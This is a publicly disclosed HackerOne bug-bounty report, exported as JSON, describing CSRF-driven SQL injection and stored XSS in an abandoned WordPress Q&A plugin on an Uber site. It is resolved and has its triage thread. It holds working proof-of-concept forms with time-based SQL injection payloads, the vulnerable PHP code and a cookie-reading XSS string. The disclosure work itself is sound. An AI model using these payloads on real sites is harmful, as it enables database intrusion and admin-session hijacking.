{"id":135288,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzUyODg=","url":"https://hackerone.com/reports/135288","title":"Multiple vulnerabilities in a WordPress plugin at drive.uber.com","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-04-29T02:57:55.343Z","submitted_at":"2016-04-29T02:57:55.343Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"0xsyndr0me","url":"/0xsyndr0me","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/040/377/8b0b9be2bac5759979445550c29fbd6f8612469b_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":314,"url":"https://hackerone.com/uber","handle":"uber","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Uber","twitter_handle":"","website":"https://www.uber.com","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-08-23T20:13:36.554Z","bug_reporter_agreed_on_going_public_at":"2016-08-17T23:03:37.319Z","team_member_agreed_on_going_public_at":"2016-08-23T20:13:36.443Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi again,\n\nThe story begins when I started looking at https://drive.uber.com/ukmarketplace/welcome/, at the first glance I noticed that you are running WordPress 4.4.2 (which you probably know is outdated now [[1]](https://codex.wordpress.org/Version_4.5#Security) ). So first you need to update to the latest version to patch the publicly known vulnerabilities.\n\nWhen I looked at the plugins, all of them were up-to-date. However, when I looked up WordPress plugins for **q-and-a** plugin, I could not find it. It was removed from WordPress. So I googled any known vulnerabilities in the plugin and I found that it's vulnerable to Full Path Disclosure but the technical details of the vulnerability went down when OSVDB decided to go down [[2]](https://wpvulndb.com/vulnerabilities/7049). \n\nCommunicated developers but said it's no longer supported, and contacting you without a solid bug in hand would be useless, So I decided to download the latest known version from WordPress Plugin Repository [[3]] (http://plugins.svn.wordpress.org/q-and-a/trunk/) -Which is the one you are running (1.0.6.2)- and try my luck. \n\n## Background  \nThe attack requires a logged-in administrator of the blog to visit an attacker-controlled website. \n\n## Vulnerabilities\n\n### SQL INJECTION(s)\nI discovered that one endpoint is vulnerable to 2 SQL injection vulnerabilities due to non-escaping of certain parameters\n\n#### 1st Vulnerability\n\n**Steps to reproduce**\n1. Create a page with the following code\n\n```\n\u003cform action=\"https://drive.uber.com/ukmarketplace/wp-admin/edit.php?post_type=qa_faqs\u0026page=faqpageorder\" target=\"_blank\"  method=\"post\" style=\"display: none;\"\u003e\n            \u003cinput type=\"text\" name=\"btnOrderPages\" value=\"Click to Reorder FAQs\" /\u003e\n            \u003cinput type=\"text\" name=\"hdnfaqpageorder\" value=\"id_8,id_7\" /\u003e\n            \u003cinput type=\"text\" name=\"hdnParentID\" value=\"IF(MID(VERSION(),1,1) = 5, SLEEP(5), 0)\" /\u003e\n            \u003cinput type=\"text\" name=\"btnReturnParent\" value=\"1\" /\u003e\n            \u003cinput type=\"submit\" name=\"send\" value=\"Save\" /\u003e\n\u003c/form\u003e\n\u003cscript type=\"text/javascript\"\u003e\ndocument.forms[0].submit();\n\u003c/script\u003e\n```\n2. Visit the page with a logged-in administrator account\n\nThe payload used, confirms that the current database version is 5.x.x by sleeping 5 seconds\n\nVulnerability exists due to POST data not being escaped before injecting into query at `plugins/q-and-a/inc/reorder.php`\n\n```\n45. if (isset($_POST['btnReturnParent'])) { \n46. \t$parentsParent = $wpdb-\u003eget_row(\"SELECT post_parent FROM $wpdb-\u003eposts WHERE ID = \" . $_POST['hdnParentID'], ARRAY_N);\n47. \t$parentID = $parentsParent[0];\n48. }\n```\n\n\n#### 2nd Vulnerability\n**Steps to reproduce**\n1. Create a page with the following code\n\n```\n\u003cform action=\"https://drive.uber.com/ukmarketplace/wp-admin/edit.php?post_type=qa_faqs\u0026page=faqpageorder\" target=\"_blank\"  method=\"post\" style=\"display: none;\"\u003e\n            \u003cinput type=\"text\" name=\"btnOrderPages\" value=\"Click to Reorder FAQs\" /\u003e\n            \u003cinput type=\"text\" name=\"hdnfaqpageorder\" value=\"id_8,id_7\" /\u003e\n            \u003cinput type=\"text\" name=\"hdnParentID\" value=\"\" /\u003e\n            \u003cinput type=\"text\" name=\"pages\" value=\"IF(MID(VERSION(),1,1) = 5, SLEEP(5), 0)\" /\u003e\n            \u003cinput type=\"text\" name=\"btnSubPages\" value=\"1\" /\u003e\n            \u003cinput type=\"submit\" name=\"send\" value=\"Save\" /\u003e\n\u003c/form\u003e\n\u003cscript type=\"text/javascript\"\u003e\ndocument.forms[0].submit();\n\u003c/script\u003e\n```\n2. Visit the page with a logged-in administrator account\n\nThe payload used, confirms that the current database version is 5.x.x by sleeping 5 seconds\n\nVulnerability exists due to POST data not being escaped before injecting into query at `plugins/q-and-a/inc/reorder.php`\n\n```\n38. if (isset($_POST['btnSubPages'])) { \n39. \t$parentID = $_POST['pages'];\n40. }\n41. elseif (isset($_POST['hdnParentID'])) { \n42. \t$parentID = $_POST['hdnParentID'];\n43. }\n```\n\n```\n253. function faqpageorder_pageQuery($parentID)\n254. {\n255. \tglobal $wpdb;\n256.\treturn $wpdb-\u003eget_results(\"SELECT * FROM $wpdb-\u003eposts WHERE post_parent = $parentID and post_type = 'qa_faqs' AND post_status != 'trash' AND post_status != 'auto-draft' ORDER BY menu_order ASC\");\n257. }\n```\n\n\n### Cross-Site Scripting (XSS)\nThis turned out to be false positive or to be more accurate not possible to exploit remotely because the page is protected by CSRF nonce which is hard to obtain so remote attack vector will eventually fail. but since it is stored XSS, a malicious administrator can use it to inject javascript code into adminpanel.\n\n**Steps to reproduce**\n1. Log into admin panel\n2. Go to Settings -\u003e Q \u0026 A\n3. Change FAQ homepage into your payload (`'\"/autofocus/onfocus=alert(document.domain%2bdocument.cookie);//`)\n4. Save Settings\n\n\n### Cross-Site Request Forgery (CSRF)\nAs it has been clear from previous requests that FAQs reordering is vulnerable to CSRF which does not really pose a serious threat to the website.\n**Vulnerable Endpoint:** http://localhost/wp/wp-admin/edit.php?post_type=qa_faqs\u0026page=faqpageorder\n\n## Final Note\nOf course these are not all the bugs that exist in the plugin, I just made a quick test to prove that the plugin is vulnerable to serious threats. Do you really believe it is worth it to keep a no longer supported plugin? It's your call of course. However, when I communicated the developers of the plugin at madebyraygun.com for their assistance, this was their reply\n\n\u003eSorry Abood, we have not developed or maintained that plugin for many years and do not have access to the source code or repository. The developer who was working on it more recently has pulled it from the WP repository, I believe. If you are responsible for a site that uses the plugin, **I would recommend removing it and using something that is more up to date**. \n\nThank you for your time!\n\n**References:**\n[1] https://codex.wordpress.org/Version_4.5#Security\n[2] https://wpvulndb.com/vulnerabilities/7049\n[3] http://plugins.svn.wordpress.org/q-and-a/trunk/","bounty_amount":"5000.0","formatted_bounty":"$5,000","weakness":{"id":67,"name":"SQL Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-09-16T23:03:37.449Z","allow_singular_disclosure_after":-159892528.143079,"singular_disclosure_allowed":true,"vote_count":53,"voters":["sameoldstory","rijalrojan","xpathmaster","michiel","bogdantcaciuc","spam404","parth","ta8ahi","ali","vijay_kumar","and 43 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":937412,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for the very well written report @syndr0me I've triaged this internally and we get this fixed as soon as possible!","automated_response":false,"created_at":"2016-05-02T21:22:35.302Z","updated_at":"2016-05-02T21:22:35.302Z","actor":{"username":"mandatoryuber","cleared":false,"url":"/mandatoryuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/287/fe7ca43da855a13d789192535962231dc7bee6ec_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":954201,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks @mandatoryuber for your words. \nWhat are you going to do next? Fix it or remove it and find an alternative? ","automated_response":false,"created_at":"2016-05-12T19:59:20.834Z","updated_at":"2016-05-12T19:59:20.834Z","actor":{"username":"0xsyndr0me","cleared":false,"url":"/0xsyndr0me","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/377/8b0b9be2bac5759979445550c29fbd6f8612469b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1015958,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"From our developers:\n\"Plugin disabled and deleted. Upgraded site and all plugins.\"","automated_response":false,"created_at":"2016-06-15T20:48:58.680Z","updated_at":"2016-06-15T20:48:58.680Z","actor":{"username":"mandatoryuber","cleared":false,"url":"/mandatoryuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/287/fe7ca43da855a13d789192535962231dc7bee6ec_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"0xsyndr0me","url":"/0xsyndr0me"},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1043366,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for the great find!","automated_response":false,"created_at":"2016-06-28T16:12:43.676Z","updated_at":"2016-06-28T16:12:43.676Z","actor":{"url":"/uber","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Uber"}},"bounty_amount":"5000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"uber","collaborator":{"username":"0xsyndr0me","url":"/0xsyndr0me"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1055010,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the bounty ^_^","automated_response":false,"created_at":"2016-07-06T06:16:17.327Z","updated_at":"2016-07-06T06:16:17.327Z","actor":{"username":"0xsyndr0me","cleared":false,"url":"/0xsyndr0me","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/377/8b0b9be2bac5759979445550c29fbd6f8612469b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1133217,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Can we publicly disclose this one? ;)","automated_response":false,"created_at":"2016-08-17T23:03:37.364Z","updated_at":"2016-08-17T23:03:37.364Z","first_to_agree":true,"actor":{"username":"0xsyndr0me","cleared":false,"url":"/0xsyndr0me","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/377/8b0b9be2bac5759979445550c29fbd6f8612469b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1150102,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Sure thing @syndr0me!","automated_response":false,"created_at":"2016-08-23T20:13:36.483Z","updated_at":"2016-08-23T20:13:36.483Z","actor":{"username":"lyoung-uber","cleared":false,"url":"/lyoung-uber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/079/873/b506b7984a2afcd680a9d5e57f66a0c524760b47_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1150103,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-08-23T20:13:36.600Z","updated_at":"2016-08-23T20:13:36.600Z","actor":{"username":"lyoung-uber","cleared":false,"url":"/lyoung-uber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/079/873/b506b7984a2afcd680a9d5e57f66a0c524760b47_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}